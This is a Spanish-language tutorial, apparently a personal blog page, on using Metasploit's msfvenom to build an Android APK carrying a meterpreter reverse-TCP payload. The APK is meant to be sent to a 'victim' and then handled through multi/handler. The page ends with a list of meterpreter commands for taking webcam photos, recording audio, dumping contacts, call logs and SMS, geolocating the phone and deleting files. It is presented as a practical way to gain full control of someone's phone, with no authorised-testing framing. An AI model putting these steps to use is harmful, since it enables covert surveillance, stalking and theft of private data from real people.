## Crear un payload de Android usando Metasploit.

Buenas, Esto es una guía básica y sencilla para infectar un android a través de una apk infectada con un payload.

La herramienta Metasploit viene instalada por defecto en Kali Linux.

Lo primero, que es un payload?

Un payload es un virus o malware que consiste en realizar una acción (normalmente maliciosa) en un dispositivo que esté conectado dentro de nuestra red o fuera de otra. El fin que tiene un payload es tener control total y remoto del dispositivo que se quiera interceptar en cuestión.

Básicamente, es un virus que nos va a permitir controlar desde una consola un dispositivo.
(Poder hacer fotos, capturas, rastrear llamadas, borrar archivos y todo lo que te puedas imaginar)

¿Qué es Metasploit?

es una herramienta de hacking y pentesting destinada a la explotación y tests de penetración de una manera sencilla. Esta herramienta es conocida por ser como una "navaja suiza" para los hackers y prácticamente todas las distribuciones de Linux lo traen.

## Paso 1
Abrimos la aplicación "Metasploit" y escribimos el comando "msfvenom -p android/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx R > name.apk"

El comando se divide en varias partes que son:

msfvenom -> Es la aplicación donde desarrollamos el payload

-p -> Estamos indicando que vamos a realizar un payload

android/meterpreter/reverse_tcp -> Es el tipo de payload que necesitamos

LHOST -> Es la IP que usará la aplicación para comunicarse con nosotros. Si se va a hacer dentro de la red nuestra el valor es 192.168.1.1 pero si es fuera de nuestra red deberá ser nuestra IP Pública

LPORT -> Es el puerto donde se conectará nuestra aplicación. Si la red es interna yo uso el puerto 8080 pero si es en una red exterior deberemos abrir el puerto que deseemos

R > name.apk -> Es la ruta donde almacenaremos el payload y con que nombre. La ruta por defecto (cuando ponemos solo el nombre, es la carpeta personal o la de root).

## Paso 2
Ahora, nuestro payload se ha guardado en la carpeta que tengamos por defecto en Kali Linux. ese archivo .apk es el que tenemos que envíar a la víctima.

Una vez hayamos introducido el payload en el móvil de nuestra víctima ponemos los siguientes comandos:

msfconsole -> Iniciamos la aplicación de monitoreo

use multi/handler

set PAYLOAD android/meterpreter/reverse_tcp -> Indicamos cual payload queremos detectar

set LHOST xxxx -> Indicamos la IP asignada al payload. (la misma que hemos asignado a la hora de generarlo)

set LPORT xxxx -> Indicamos el puerto asignado al payload (el mismo que hemos asignado a la hora de generarlo)

exploit  -> para iniciar el ataque.

Una vez llegados a este punto, si la víctima abre el apk deberemos tener control total sobre el teléfono.

## COMANDOS

Estos son todos los comandos que podemos ejecutar para controlar el android de la víctima.

meterpreter > pwd — Ubicacion actual directorio

meterpreter > cd cache — Cache

meterpreter > cat — Para ver archivos

meterpreter > ls — Listar archivos

meterpreter > upload <archivo> — Subir archivo
  
meterpreter > download <archivo> — Descargar archivo
  
meterpreter > ifconfig — Detalle configuracion redes
  
meterpreter > ps — Lista procesos
  
meterpreter > sysinfo — Informacion de sistema
  
meterpreter > webcam_list — Listado de webcam
  
meterpreter > webcam_snap -i 2 — Capturar imagen de camara 2
  
meterpreter > webcam_stream -l 2 — Streaming video de camara 2
  
meterpreter > record_mic -d 20 — Grabar 20s de audio
  
meterpreter > dump_calllog — Obtener registro de llamadas
  
meterpreter > dump_contacts — Obtener registro de contactos
  
meterpreter > geolocate — Obtener ubicacion del telefono
  
meterpreter > send_sms -d <num> -t text — Enviar SMS (deja huellas)
  
meterpreter > dump_sms — Ver los sms recibidos
  
meterpreter > route_list — Ruteo de direcciones
  
meterpreter > cd /sdcard — Lista archivos de SD Card
  
meterpreter > rm <archivo> — Eliminar archivo
  
meterpreter > rmdir <carpeta> — Eliminar carpeta
  
meterpreter > mkdir <dir> — Crear carpeta
  
meterpreter > search -f *.mp3 — Buscar archivos extension mp3
  
meterpreter > set_audio_mode -m 0 — 0:Silencio 1:Medio 2:Maximo
  
meterpreter > shell — Ejecutar una shell
  
> exit — Finaliza la shell


[Volver](https://minicompi4.github.io)
